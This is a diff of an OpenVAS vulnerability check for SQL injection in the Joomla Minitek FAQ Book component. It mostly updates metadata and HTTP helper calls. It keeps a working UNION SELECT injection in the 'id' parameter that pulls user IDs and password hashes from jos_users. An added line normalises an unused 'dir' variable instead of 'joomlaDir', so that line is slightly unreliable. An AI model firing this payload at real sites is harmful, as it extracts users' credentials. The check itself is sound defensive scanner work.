@@ -1,6 +1,6 @@
 ##############################################################################
 # OpenVAS Vulnerability Test
-# $Id: gb_joomla_minitek_sql_inj_vuln.nasl 3117 2016-04-19 10:19:37Z benallard $
+# $Id: gb_joomla_minitek_sql_inj_vuln.nasl 5840 2017-04-03 12:02:24Z cfi $
 #
 # Joomla Minitek FAQ Book 'id' Parameter SQL Injection Vulnerability
 #
@@ -44,8 +44,8 @@ prone to SQL injection vulnerability.";
 if(description)
 {
   script_id(802106);
-  script_version("$Revision: 3117 $");
-  script_tag(name:"last_modification", value:"$Date: 2016-04-19 12:19:37 +0200 (Tue, 19 Apr 2016) $");
+  script_version("$Revision: 5840 $");
+  script_tag(name:"last_modification", value:"$Date: 2017-04-03 14:02:24 +0200 (Mon, 03 Apr 2017) $");
   script_tag(name:"creation_date", value:"2011-06-20 15:22:27 +0200 (Mon, 20 Jun 2011)");
   script_bugtraq_id(48223);
   script_tag(name:"cvss_base", value:"7.5");
@@ -56,13 +56,12 @@ if(description)
   script_xref(name : "URL" , value : "http://www.exploit-id.com/web-applications/joomla-component-minitek-faq-book-sql-injection");
 
   script_tag(name:"qod_type", value:"remote_vul");
-  script_summary("Check if Joomla Minitek FAQ Book component is vulnerable for SQL Injection attack");
   script_category(ACT_ATTACK);
   script_copyright("Copyright (C) 2011 Greenbone Networks GmbH");
   script_family("Web application abuses");
   script_dependencies("joomla_detect.nasl");
   script_require_ports("Services/www", 80);
-  script_require_keys("joomla/installed");
+  script_mandatory_keys("joomla/installed");
   script_tag(name : "impact" , value : tag_impact);
   script_tag(name : "affected" , value : tag_affected);
   script_tag(name : "insight" , value : tag_insight);
@@ -71,24 +70,22 @@ if(description)
   exit(0);
 }
 
-
 include("http_func.inc");
 include("http_keepalive.inc");
 include("version_func.inc");
 
-## Get the port
 joomlaPort = get_http_port(default:80);
-if(!joomlaPort){
-  exit(0);
-}
 
-## Get the application directiory
 if(!joomlaDir = get_dir_from_kb(port:joomlaPort, app:"joomla")){
   exit(0);
 }
 
+host = http_host_name( port:joomlaPort );
+
+if( dir == "/" ) dir = "";
+
 sndReq = http_get(item:string(joomlaDir, "/index.php"), port:joomlaPort);
-rcvRes = http_send_recv(port:joomlaPort, data:sndReq);
+rcvRes = http_keepalive_send_recv(port:joomlaPort, data:sndReq);
 
 ## Extract the Cookie from the response to construct request
 cookie = eregmatch(pattern:"Set-Cookie: ([a-zA-Z0-9=]+).*", string:rcvRes);
@@ -96,8 +93,7 @@ cookie = eregmatch(pattern:"Set-Cookie: ([a-zA-Z0-9=]+).*", string:rcvRes);
 ## Set the Cookie, If it does not come in the Response
 if(!cookie[1]){
   cookie = "bce47a007c8b2cf96f79c7a0d154a9be=399e73298f66054c1a66858050b785bf";
-}
-else{
+} else {
   cookie = cookie[1];
 }
 
@@ -106,9 +102,8 @@ sndReq = string("GET ", joomlaDir, "/index.php?option=com_faqbook&view=category"
                 "&id=-7+union+select+1,2,3,4,5,6,7,8,concat_ws(0x3a,0x4f70656e564153," +
                 "id,password,0x4f70656e564153,name),10,11,12,13,14,15,16,17,18,19," +
                 "20,21,22,23,24,25,26+from+jos_users--", " HTTP/1.1\r\n",
-                "Host: ", get_host_name(), "\r\n",
-                "User-Agent: Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.15)" +
-                            "Gecko/2009102704 Fedora/3.0.15-1.fc10 Firefox/3.0.15\r\n",
+                "Host: ", host, "\r\n",
+                "User-Agent: ", OPENVAS_HTTP_USER_AGENT, "\r\n",
                 "Cookie: ", cookie , "; path=/", "\r\n\r\n");
 
 rcvRes = http_keepalive_send_recv(port:joomlaPort, data:sndReq);
